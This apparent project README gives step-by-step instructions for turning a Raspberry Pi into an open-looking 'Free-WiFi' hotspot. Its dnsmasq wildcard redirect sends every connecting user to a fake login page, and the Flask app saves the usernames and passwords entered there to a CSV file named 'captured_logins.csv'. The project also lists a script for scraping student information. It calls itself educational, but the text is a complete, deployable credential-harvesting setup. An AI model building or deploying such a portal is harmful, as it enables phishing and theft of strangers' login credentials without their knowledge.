# Raspberry Pi Captive Portal Login Collector

This project turns a Raspberry Pi 3 into a captive portal. It broadcasts a Wi-Fi network and serves a login page to any connecting user. The credentials entered on this page are saved to a CSV file on the Pi.

This setup is intended for educational purposes to demonstrate how captive portals work.

## Project Structure

- `main.py`: The original script for scraping student information from a website. Optimized to run in headless mode.
- `inspector.py`: A helper script to inspect web form elements.
- `portal/`: A directory containing the Flask web application for the captive portal.
  - `app.py`: The Flask server that serves the login page and saves credentials.
  - `templates/index.html`: The HTML login page.
- `data/`: A directory for storing CSV files.

## How It Works

1.  The Raspberry Pi is configured to act as a Wi-Fi Access Point (AP).
2.  It runs a DHCP and DNS server (`dnsmasq`) to manage connected devices and redirect all web traffic to itself.
3.  A Flask web server (`portal/app.py`) runs on the Pi, listening on port 80.
4.  When a user connects to the Wi-Fi network and tries to open any website, the DNS redirect sends them to the Flask application, which displays the `index.html` login page.
5.  The user enters a username and password, which are sent via a POST request to the Flask app.
6.  The app saves the credentials to `portal/captured_logins.csv`.

## Setup Instructions

These instructions assume you are starting with a fresh installation of Raspberry Pi OS with desktop.

### Step 1: Set up the Web Application

First, clone or copy the project files to your Raspberry Pi.

1.  **Install Dependencies:**
    Open a terminal on your Raspberry Pi and install the required Python libraries.

    ```bash
    # Install Flask for the portal and Selenium for the scraper
    sudo pip3 install Flask selenium beautifulsoup4 requests
    ```

2.  **Run the Web Server:**
    To test the web server, navigate into the `portal` directory and run the app. You will need to use `sudo` because it runs on port 80.

    ```bash
    cd /path/to/project/portal
    sudo python3 app.py
    ```
    You can test this from another computer on the same network by navigating to your Pi's IP address before you configure the access point.

### Step 2: Configure the Raspberry Pi as an Access Point

This part turns your Pi into a standalone Wi-Fi hotspot.

1.  **Install `hostapd` and `dnsmasq`:**

    ```bash
    sudo apt update
    sudo apt install hostapd dnsmasq
    ```

2.  **Configure a Static IP for the Wi-Fi Interface:**
    We need the Pi's Wi-Fi interface (`wlan0`) to have a fixed IP address.

    ```bash
    sudo nano /etc/dhcpcd.conf
    ```
    Go to the end of the file and add the following lines:

    ```
    interface wlan0
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
    ```

3.  **Configure `hostapd` (The Access Point Software):**
    Create a configuration file for `hostapd`:

    ```bash
    sudo nano /etc/hostapd/hostapd.conf
    ```
    Add the following content. You can change the `ssid` (network name) and `wpa_passphrase` (password).

    ```
    interface=wlan0
    driver=nl80211
    ssid=Free-WiFi
    hw_mode=g
    channel=7
    wpa=2
    wpa_passphrase=password123
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    auth_algs=1
    ignore_broadcast_ssid=0
    ```
    Now, tell the system where to find this configuration file:

    ```bash
    sudo nano /etc/default/hostapd
    ```
    Find the line `#DAEMON_CONF=""` and change it to:
    ```
    DAEMON_CONF="/etc/hostapd/hostapd.conf"
    ```

4.  **Configure `dnsmasq` (The DNS & DHCP Server):**
    This is the key to the captive portal. We will redirect all traffic to our Pi.

    First, rename the original config file:
    ```bash
    sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
    ```
    Now create a new one:
    ```bash
    sudo nano /etc/dnsmasq.conf
    ```
    Add the following content:
    ```
    interface=wlan0
    dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
    # This line redirects all DNS requests to the Pi's own IP address
    address=/#/192.168.4.1
    ```

5.  **Start the Services:**
    Reboot your Pi for all the changes to take effect.

    ```bash
    sudo reboot
    ```

### Step 3: Final Deployment

1.  After the Pi reboots, it will be broadcasting the new Wi-Fi network.
2.  You need to make sure the Flask web server starts automatically. You can do this by setting up a `systemd` service or by using `crontab`.

    **Using crontab (simple method):**
    ```bash
    crontab -e
    ```
    Add this line to the end of the file to run the script on boot:
    ```
    @reboot sudo python3 /path/to/project/portal/app.py &
    ```
3.  Connect a device (like a phone) to the new Wi-Fi network. It should automatically open a login page.
4.  Any credentials you enter will be saved in `portal/captured_logins.csv`.
